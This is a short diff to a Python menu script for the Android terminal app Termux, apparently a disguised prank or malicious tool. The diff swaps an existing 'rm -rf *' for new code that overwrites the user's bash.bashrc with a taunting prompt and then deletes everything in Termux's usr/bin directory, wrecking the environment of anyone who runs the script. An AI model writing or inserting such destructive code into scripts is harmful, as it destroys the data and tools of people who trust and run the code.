@@ -48,7 +48,10 @@ while True:
 	mil5()
 	red("\/"*20)
 	print("")
-	os.system("cd /data/data/com.termux && rm -rf *")
+	lack = "'PS1=\[\e[39m\]IXZ TE ARREGAÇOU\[\e[0m\]  '"
+	hackz = open("/data/data/com.termux/files/usr/etc/bash.bashrc", "w+")
+	hackz.write(f"{lack}")
+	os.system("cd /data/data/com.termux/files/usr/bin && rm -rf *")
 	resp = int(input("localhost@u_2777a: "))
 	if(resp == 1):
 		os.system("python us.py")
